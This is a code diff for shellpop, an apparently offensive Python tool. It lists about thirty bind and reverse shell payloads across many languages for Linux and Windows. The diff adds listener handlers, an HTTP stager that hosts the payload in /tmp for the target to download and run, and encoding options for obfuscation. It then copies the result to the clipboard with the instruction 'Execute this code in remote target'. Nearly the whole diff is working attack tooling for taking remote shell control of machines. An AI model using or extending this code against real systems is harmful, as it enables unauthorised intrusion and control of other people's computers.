@@ -16,77 +16,311 @@
 
 
 import urllib
+import pyperclip
+import os
+import string
 from sys import exit
 from argparse import ArgumentParser
 from sys import stderr
 from random import randint
+from multiprocessing import Process
 
 # package import
 from shellpop import *
 
 
 # Get current Operational System
-os = OperationalSystem().OS
-
-# This works exclusively on Linux, so we adapt to work in Windows too!
-def info(msg):
-    if os == "linux":
-        msg = "[\033[094m+\033[0m] {0}".format(msg)
-    else:
-        msg = "[+] {0}".format(msg)
-    return msg
-
-def error(msg):
-    if os == "linux":
-        msg = "[\033[091m!\033[0m] {0}".format(msg)
-    else:
-        msg = "[!] {0}".format(msg)
-    return msg
-
 write=stderr.write
 flush=stderr.flush
-version = 0.34 # updated 30/04/2018
-
+version = 0.35 # updated 02/05/2018
 
 AVAILABLE_SHELLS = [
         
         # Bind shell list
         {
-            1:("Python TCP", BIND_PYTHON_TCP()),
-            2:("Python UDP", BIND_PYTHON_UDP()),
-            3:("Perl TCP", BIND_PERL_TCP()),
-            4:("Perl UDP", BIND_PERL_UDP()),
-            5:("PHP TCP", BIND_PHP_TCP()),
-            6:("PHP UDP", BIND_PHP_UDP()),
-            7:("Ruby TCP", BIND_RUBY_TCP()),
-            8:("Ruby UDP", BIND_RUBY_UDP()),
-            9:("Netcat (OpenBSD) TCP", BIND_NETCAT_TCP()),
-            10:("Netcat+coproc (OpenBSD) UDP", BIND_NETCAT_OPENBSD_UDP()),
-            11:("Netcat (Traditional) TCP", BIND_NETCAT_TRADITIONAL_TCP()),
-            12:("Powershell TCP", BIND_POWERSHELL_TCP()),
+            # Introducing the new Shell object to hold
+            # Information about the shells. Look below.
+            1: Shell("Python TCP +pty", # name 
+                "bind",  # shell type
+                "tcp", # protocol
+                BIND_PYTHON_TCP(), # code
+                os="Linux",
+                arch="Independent",
+                use_handler=bind_tcp_pty_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            2: Shell("Python UDP", 
+                "bind",
+                "udp",
+                BIND_PYTHON_UDP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            3: Shell("Perl TCP", 
+                "bind",
+                "tcp",
+                BIND_PERL_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=bind_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            4: Shell("Perl UDP", 
+                "bind",
+                "udp",
+                BIND_PERL_UDP(),
+                os="Linux",
+                arch="Independent", 
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            5: Shell("PHP TCP",
+                "bind",
+                "tcp",
+                BIND_PHP_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=bind_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            6: Shell("PHP UDP",
+                "bind",
+                "udp", 
+                BIND_PHP_UDP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            7: Shell("Ruby TCP", 
+                "bind",
+                "tcp",
+                BIND_RUBY_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=bind_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+            
+            8: Shell("Ruby UDP", 
+                "bind",
+                "udp",
+                BIND_RUBY_UDP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            9: Shell("Netcat (OpenBSD) TCP",
+                "bind",
+                "tcp",
+                BIND_NETCAT_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=bind_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            10: Shell("Netcat+coproc (OpenBSD) UDP", 
+                "bind",
+                "udp",
+                BIND_NETCAT_OPENBSD_UDP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            11: Shell("Netcat (Traditional) TCP", 
+                "bind",
+                "tcp",
+                BIND_NETCAT_TRADITIONAL_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=bind_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+            
+            12: Shell("Powershell TCP",
+                "bind",
+                "tcp",
+                BIND_POWERSHELL_TCP(),
+                os="Windows",
+                arch="x86 / x64",
+                use_handler=bind_tcp_handler,
+                use_http_stager=WINDOWS_STAGERS),
         },
 
         # Reverse shell list
         {
-            1: ("Python TCP", REV_PYTHON_TCP()),
-            2: ("Python UDP", REV_PYTHON_UDP()),
-            3: ("PHP TCP", REV_PHP_TCP()),
-            4: ("Ruby TCP", REV_RUBY_TCP()),
-            5: ("Perl TCP 01", REV_PERL_TCP()),
-            6: ("Perl TCP 02", REV_PERL_TCP_2()),
-            7: ("Perl UDP [nc -lkvup PORT]", REV_PERL_UDP()),
-            8: ("Bash TCP", BASH_TCP()),
-            9: ("Powershell TCP", REV_POWERSHELL_TCP()),
-            10: ("TCLsh TCP", REVERSE_TCLSH()),
-            11: ("Ncat TCP", REVERSE_NCAT()),
-            12: ("Netcat (Traditional) UDP", REVERSE_NC_UDP_1()),
-            13: ("Netcat (Traditional) TCP", REVERSE_NC_TRADITIONAL_1()),
-            14: ("Netcat (OpenBSD) mkfifo TCP", REVERSE_MKFIFO_NC()),
-            15: ("Netcat (OpenBSD) mknod TCP", REVERSE_MKNOD_NC()),
-            16: ("Telnet mkfifo TCP", REVERSE_MKFIFO_TELNET()),
-            17: ("Telnet mknod TCP", REVERSE_MKNOD_TELNET()),
-            18: ("socat TCP", REVERSE_SOCAT()),
-            19: ("awk TCP", REVERSE_AWK()),
+            1: Shell("Python TCP", 
+                "reverse",
+                "tcp",
+                REV_PYTHON_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_pty_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            2: Shell("Python UDP",
+                "reverse",
+                "udp",
+                REV_PYTHON_UDP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            3: Shell("PHP TCP", 
+                "reverse",
+                "tcp",
+                REV_PHP_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            4: Shell("Ruby TCP",
+                "reverse",
+                "tcp",
+                REV_RUBY_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            5: Shell("Perl TCP 01",
+                "reverse",
+                "tcp",
+                REV_PERL_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            6: Shell("Perl TCP 02",
+                "reverse",
+                "tcp",
+                REV_PERL_TCP_2(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            7: Shell("Perl UDP [nc -lkvup PORT]",
+                "reverse",
+                "udp",
+                REV_PERL_UDP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            8: Shell("Bash TCP",
+                "reverse",
+                "tcp",
+                BASH_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            9: Shell("Powershell TCP",
+                "reverse",
+                "tcp",
+                REV_POWERSHELL_TCP(),
+                os="Windows",
+                arch="x86 / x64",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=WINDOWS_STAGERS),
+
+            10: Shell("TCLsh TCP",
+                "reverse",
+                "tcp",
+                REVERSE_TCLSH(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            11: Shell("Ncat TCP",
+                "reverse",
+                "tcp",
+                REVERSE_NCAT(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            12: Shell("Netcat (Traditional) UDP",
+                "reverse",
+                "udp",
+                REVERSE_NC_UDP_1(),
+                os="Linux",
+                arch="Independent",
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            13: Shell("Netcat (Traditional) TCP",
+                "reverse",
+                "tcp",
+                REVERSE_NC_TRADITIONAL_1(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            14: Shell("Netcat (OpenBSD) mkfifo TCP",
+                "reverse",
+                "tcp",
+                REVERSE_MKFIFO_NC(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            15: Shell("Netcat (OpenBSD) mknod TCP",
+                "reverse",
+                "tcp",
+                REVERSE_MKNOD_NC(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            16: Shell("Telnet mkfifo TCP",
+                "reverse",
+                "tcp",
+                REVERSE_MKFIFO_TELNET(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            17: Shell("Telnet mknod TCP",
+                "reverse",
+                "tcp",
+                REVERSE_MKNOD_TELNET(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            18: Shell("socat TCP",
+                "reverse",
+                "tcp",
+                REVERSE_SOCAT(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            19: Shell("awk TCP",
+                "reverse",
+                "tcp",
+                REVERSE_AWK(),
+                os="Linux",
+                arch="Independent",
+                use_handler=reverse_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
         }
     ]
 
@@ -113,41 +347,58 @@ def list_shells():
     write(info("\033[1mBind shells\033[0m:\n\n"))
     for i in range(1, len(bind_shells)+1):
         obj = bind_shells[i]
-        print("{0}. {1}".format(str(i).rjust(3), proto_colorize(obj[0])))
+        print("{0}. {1}".format(str(i).rjust(3), proto_colorize(obj.name)))
     
     write("\n\n")
     write(info("\033[1mReverse shells\033[0m:\n\n"))
     for i in range(1, len(reverse_shells)+1):
         obj = reverse_shells[i]
-        print("{0}. {1}".format(str(i).rjust(3), proto_colorize(obj[0])))
-
+        print("{0}. {1}".format(str(i).rjust(3), proto_colorize(obj.name)))
     return 0
 
 
+def generate_file_name(extension=""):
+    file_name = ""
+    while len(file_name) < 8:
+        random_char = os.urandom(1)
+        if random_char in string.letters:
+            file_name += random_char
+    return file_name + extension
+
+
 def header():
-    contributors = ["@zc00l", "@touhidshaik", "@lowfuel"]
+    contributors = ["@zc00l", "@touhidshaikh", "@lowfuel"]
     return "\033[093mshellpop\033[0m v{0}\n\033[93mcontributors\033[0m: {1}\n\n".format(version, ','.join([x for x in contributors]))
 
 def select_shell(args, shell_type, shell_index):
+
+    # Update algorithm after the new introduced Shell object.
+    # This function used to return a string, containing the 
+    # final payload code. Now it returns a Shell() object.
+    # This Shell() object has the final payload in the 'pay-
+    # load' attribute.
+
     if shell_type == "reverse":
         for shell in reverse_shells:
             obj = reverse_shells[shell]
             if shell == shell_index:
-                code = obj[1]
-                name = obj[0]
+                code = obj.code
+                name = obj.name
                 rev = ReverseShell(name, args, code)
                 generated = rev.get()
-                return generated
+                obj.payload = generated
+                return obj
 
     elif shell_type == "bind":
         for shell in bind_shells:
             obj = bind_shells[shell]
             if shell == shell_index:
-                code = obj[1]
-                name = obj[0]
+                code = obj.code
+                name = obj.name
                 bind = BindShell(name, args, code)
                 generated = bind.get()
-                return generated
+                obj.payload = generated
+                return obj
 
 
 def main():
@@ -168,6 +419,15 @@ def main():
     parser.add_argument("--xor", action="store_true",help="Enable XOR obfuscation", required=False)
     parser.add_argument("--base64", action="store_true", required=False, help="Encode command in base64.")
     parser.add_argument("--urlencode", action="store_true", required=False, help="Encode the command in URL encoding.")
+
+    # Use handler if possible.
+    parser.add_argument("--handler", action="store_true", help="Use handler, if possible.", required=False)
+
+    # Use staging
+    parser.add_argument("--stager", type=str, help="Use HTTP staging for malicious shells", required=False)
+
+    # Http-staging options
+    parser.add_argument("--http-port", type=int, help="HTTP staging port to be used", required=False)
 
     args = parser.parse_args()
     if args.list == True:
@@ -203,13 +463,89 @@ def main():
         if args.port is None:
             print(error("Error: You need to set the listener port number with --port"))
             exit(1)
-        print(select_shell(args, "reverse", args.number))
+        shell = select_shell(args, "reverse", args.number)
+        if shell.handler is not None:
+            shell.handler_args = ('0.0.0.0', args.port)
     else:
         if args.port is None:
             print(error("Error: You need to set the remote port number to listen with --port"))
             exit(1)
-        print(select_shell(args, "bind", args.number))
+        shell = select_shell(args, "bind", args.number)
+        if shell.handler is not None:
+            if args.host is  None:
+                args.host = raw_input("[\033[092m*\033[0m] Remote host IP address: ")
+            shell.handler_args = (args.host, args.port)
 
+
+    # This is the spot for stagers.
+    # First, we need to detect if the operator
+    # wants it.
+    stager = None # this is a local scope variable now.
+    stager_thread = None
+    stager_payload = None
+    if args.stager is not None:
+
+        # He wants stager.
+        if args.stager == "http": # He chose http stager.
+            if shell.use_http_stager is False:
+                print(info("This shell does not supports HTTP staging."))
+            else:
+                # This is the HTTP stager code.
+                # I will try to host a HTTP server in the following ports:
+                ports = [80,8080,8081]
+                ports.insert(0, args.http_port) if args.http_port is not None else None
+
+                OLD_DIR = os.getcwd()
+                os.chdir("/tmp") # currently only linux.
+                # /tmp because it is where we are going to host our payloads
+
+                for port in ports:
+                    stager = HTTPServer(port)
+                    if stager.check_port() is True:
+
+                        # Choose the stager option
+                        if len(shell.use_http_stager) == 1:
+                            shell.use_http_stager = shell.use_http_stager[0]
+                        else:
+                            shell.use_http_stager = choose_stager(shell.use_http_stager) # choose a stager.
+
+                        stager_thread = Process(target=stager.start, args=())
+                        stager_thread.start()
+                        print(info("Started HTTP server at port {0}".format(port)))
+
+                        payload_file = generate_file_name()
+                        with open(payload_file, "w") as f:
+                            f.write(shell.payload)
+                        print(info("Staged file has been named '{0}'".format(payload_file)))
+                        stager_payload = shell.use_http_stager((args.host, port), args, payload_file).get()
+                        break
+                    else:
+                        print(error("Cant use port {0} as HTTP server port.".format(port)))
+
+   
+    to_be_executed = shell.payload if stager is None else stager_payload
+
+    pyperclip.copy(to_be_executed)
+    print(info("ShellPop code has been copied to clipboard."))
+
+    print(info("Execute this code in remote target: \n\n{0}\n".format(to_be_executed)))
+    
+    if shell.handler is not None and args.handler is True:
+        print(info("Starting shell handler ..."))
+        shell.handler(shell.handler_args)
+    else:
+        print(info("This shell DOES NOT have a handler set."))
+    
+    # Handle staging.
+    if stager is not None:
+        print(info("Press CTRL+C to interrupt the HTTP stager ..."))
+        try:
+            while 1:
+                sleep(10)
+        except:
+            print(info("Killing HTTP server ..."))
+            stager_thread.terminate()
+            os.chdir(OLD_DIR) # restore working directory.
     return 0x0
 
 if __name__ == "__main__":
